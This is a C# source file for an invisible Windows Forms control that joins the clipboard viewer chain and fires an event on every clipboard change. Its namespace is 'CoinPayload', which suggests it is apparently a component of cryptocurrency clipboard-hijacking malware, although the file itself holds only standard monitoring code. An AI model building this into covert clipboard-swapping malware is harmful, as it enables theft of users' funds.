using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace CoinPayload
{
    public partial class ClipboardMonitor : Control
    {
        // defined in winuser.h
        const int WM_DRAWCLIPBOARD = 0x308;
        const int WM_CHANGECBCHAIN = 0x030D;

        IntPtr nextClipboardViewer;

        /// <summary>
        /// Constructor
        /// </summary>
        public ClipboardMonitor()
        {
            this.Visible = false;
            nextClipboardViewer = (IntPtr)SetClipboardViewer((int)this.Handle);
        }

        /// <summary>
        /// Clipboard delegate
        /// </summary>
        public delegate void delClipboard();
        /// <summary>
        /// Clipboard contents changed.
        /// </summary>
        public event delClipboard ClipboardChanged;

        /// <summary>
        /// Free resources
        /// </summary>
        /// <param name="disposing">Disposing</param>
        protected override void Dispose(bool disposing)
        {
            ChangeClipboardChain(this.Handle, nextClipboardViewer);
        }

        #region WinApi
        [DllImport("User32.dll")]
        protected static extern int SetClipboardViewer(int hWndNewViewer);
        [DllImport("User32.dll", CharSet = CharSet.Auto)]
        public static extern bool ChangeClipboardChain(IntPtr hWndRemove, IntPtr hWndNewNext);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SendMessage(IntPtr hwnd, int wMsg, IntPtr wParam, IntPtr lParam);
        #endregion

        /// <summary>
        /// Windows messages
        /// </summary>
        /// <param name="m">Messages</param>
        protected override void WndProc(ref Message m)
        {
            switch (m.Msg)
            {
                case WM_DRAWCLIPBOARD:
                    {
                        OnClipboardChanged();
                        SendMessage(nextClipboardViewer, m.Msg, m.WParam, m.LParam);
                        break;
                    }
                case WM_CHANGECBCHAIN:
                    {
                        if (m.WParam == nextClipboardViewer)
                            nextClipboardViewer = m.LParam;
                        else
                            SendMessage(nextClipboardViewer, m.Msg, m.WParam, m.LParam);
                        break;
                    }
            }
            base.WndProc(ref m);
        }

        /// <summary>
        /// Clipboard Event
        /// </summary>
        void OnClipboardChanged()
        {
            try { ClipboardChanged?.Invoke(); }
            catch { }
        }
    }
}